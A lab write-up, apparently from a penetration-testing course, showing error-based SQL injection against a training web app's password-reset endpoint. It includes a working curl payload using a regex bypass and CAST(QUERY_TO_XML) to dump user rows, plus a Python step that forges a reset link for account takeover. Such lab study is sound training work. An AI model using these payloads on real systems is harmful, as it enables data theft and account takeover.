---
tags: [lab, attack/web]
module: advanced_sql_injections
last_updated: 2026-05-22
---

# Lab: Error-Based SQL Injection

Target: BlueBird application on port 8080. Requires the decompiled source from [[labs/htb/advanced_sql_injections/decompiling_java_archives]].

This lab exploits the `POST /forgot` password-reset endpoint using a CAST-to-INT error-based technique. All steps are CLI-based using curl and Python.

## Tool Installation

```bash
# curl (pre-installed on Kali)
curl --version || sudo apt install curl -y

# Python 3 (for hash computation)
python3 --version
```

No GUI required. VS Code for source review is optional — grep works for the steps below.

---

## Question 1 — Value of `passwordResetLink` for user `potus4`

**Goal:** Use error-based SQLi in `POST /forgot` to dump the user data needed to reconstruct the password reset link.

### Step 1 — Understand why this endpoint is worth targeting

**What a penetration tester looks for in a password reset flow:** Password reset endpoints are high-value targets because they often bypass standard authentication. If you can trigger a reset link for an admin account, you gain access without needing their password. The question here reverses that: can you *reconstruct* what a reset link would look like for a specific user, which implies you can compute the link value by knowing the underlying data.

Before attempting any injection, understand how the reset link is generated. From source code review of `AuthController.java`, the `forgotPOST()` method constructs the link as:

```java
String passwordResetLink = "https://bluebird.htb/reset?uid=" + user.getId() + "&code=" + passwordResetHash;
```

Where `passwordResetHash` is:

```java
String passwordResetHash = DigestUtils.md5DigestAsHex(
    ("" + user.getId() + ":" + user.getEmail() + ":" + user.getPassword()).getBytes()
);
```

**What this means for the attack:** The reset link is entirely deterministic. If you can exfiltrate the user's `id`, `email`, and `password` (bcrypt hash), you can compute the exact link locally with Python. You don't need to crack the password — the hash itself is the input to MD5.

### Step 2 — Confirm the injection point and exception behavior

**What you're looking for in the source:** The endpoint concatenates the `email` POST parameter into the SQL query without sanitization — but only if it passes a regex check. More importantly, look at the exception handling:

```bash
grep -A 40 "forgotPOST\|forgot" BOOT-INF/classes/com/bluebird/controllers/AuthController.java
```

The key observation: `EmptyResultDataAccessException` (no user found) is caught silently. But any *other* SQL exception is re-thrown and the stack trace is returned to the caller. This is the error-based channel — intentionally trigger a non-empty-result exception that includes your data in the error message.

**Why CAST-based error injection works here:** PostgreSQL can convert any value to a string via `QUERY_TO_XML()`. When you then try to CAST that string to INT, PostgreSQL raises a `DataException` with the string value embedded in the error message: `invalid input syntax for type integer: "<your data>"`. The stack trace propagated by the application contains this message, so your exfiltrated data appears in the HTTP response.

### Step 3 — Craft the bypass for the email regex

**What the regex checks:** The endpoint validates the email field against a pattern. The bypass technique is to end the payload with `--@domain.tld` — the `@domain.tld` suffix satisfies the email-address structural requirement, and the `--` comments out whatever followed in the original SQL query. Single quotes inside the injected subquery use dollar-sign quoting (`$$value$$`) to avoid breaking the outer string.

**Decision point:** You could also try blind SQLi on this endpoint (binary search, similar to the character bypass lab). But error-based is strictly faster — one request exfiltrates the entire user row instead of 7 requests per character. If the error channel exists, always prefer it.

### Step 4 — Inject QUERY_TO_XML CAST to exfiltrate user data

```bash
curl -s -X POST "http://<TARGET_IP>:8080/forgot" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "email=';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM users WHERE username = \$\$potus4\$\$ ',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb"
```

The response will contain a stack trace with the user row encoded as XML:

```xml
<users><row><id>10</id><password>$2a$12$SfnPDho...</password><email>james@usa.gov</email></row></users>
```

Write down:
- `id` = `10`
- `password` = the full bcrypt hash
- `email` = `james@usa.gov`

**Why `SELECT *` instead of specific columns:** `QUERY_TO_XML` returns the full row as XML. Selecting all columns gets you everything in one request. If you only selected `id`, you'd need a second request for the email, and a third for the password. One request is better.

### Step 5 — Reconstruct the passwordResetHash

Now that you have the three required values, compute the MD5 hash exactly as the application does it:

```bash
python3 -c '
import hashlib
uid = "10"
email = "james@usa.gov"
password = "<BCRYPT_HASH_FROM_STEP_4>"
data = uid + ":" + email + ":" + password
print(hashlib.md5(data.encode("utf-8")).hexdigest())
'
```

**Why this exact format:** The Java code concatenates: `"" + user.getId() + ":" + user.getEmail() + ":" + user.getPassword()`. The leading `""` just makes it a string concatenation from the start. In Python, this is simply `uid + ":" + email + ":" + password`. The MD5 is computed over the UTF-8 bytes of that concatenated string. Any deviation (wrong separator, wrong encoding, different field order) produces a completely different hash and an invalid link.

### Step 6 — Construct the final reset link

```
https://bluebird.htb/reset?uid=<ID>&code=<MD5_HEX>
```

This is the value that `passwordResetLink` would hold for the user `potus4`. In a real engagement, navigating to this URL would let you set a new password for the account.

---

## Why the Injection Works

| Condition | Explanation |
|-----------|-------------|
| Regex bypass | The email regex allows `'` inside the value; the `--@domain.tld` suffix satisfies the `@domain` requirement while commenting out the rest of the query |
| Exception catch | The application catches `EmptyResultDataAccessException` silently but re-throws all other exceptions with the stack trace |
| QUERY_TO_XML | Serializes the entire result set as XML text in a single string value |
| CAST to INT | Casting the XML text as integer always fails, producing a `DataException` whose message contains the XML string |

---

## Lessons Learned

- Reading exception handling code in the source is as important as reading the SQL queries themselves — silent catches vs re-throws determines whether error-based injection is possible
- QUERY_TO_XML exfiltrates an entire row in one request; this is much faster than character-by-character blind techniques and should always be tried first when error output is visible
- The reset link computation is deterministic from data in the database — hash the hash, not the password, because that's what the application code does

## Related Pages

- [[attack/web/error_based_sqli]] — CAST, STRING_AGG, QUERY_TO_XML techniques
- [[attack/web/white_box_sqli_methodology]] — reading source to locate the exception-handling pattern
- [[labs/htb/advanced_sql_injections/decompiling_java_archives]] — JAR decompilation prerequisite
